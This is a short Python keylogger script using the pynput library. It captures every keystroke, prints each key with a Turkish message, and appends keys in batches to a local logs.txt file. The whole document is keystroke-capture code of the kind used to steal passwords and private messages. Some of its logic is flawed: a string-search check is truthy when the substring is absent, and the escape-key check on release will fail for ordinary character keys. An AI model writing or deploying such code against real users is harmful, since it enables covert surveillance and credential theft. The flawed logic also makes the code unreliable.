from pynput import keyboard

count = 0
keys = []

def on_press(key):
    global keys,count
    keys.append(key)
    count += 1
    print("{0} tusuna basildi!".format(str(key)))

    if count >= 10:
        write_file(keys)
        keys = []
        count = 0

def write_file(keys):
    with open("logs.txt","a") as file:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("key"):
                file.write(str(k))
def on_release(key):
    if key == key.esc:
        return False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()



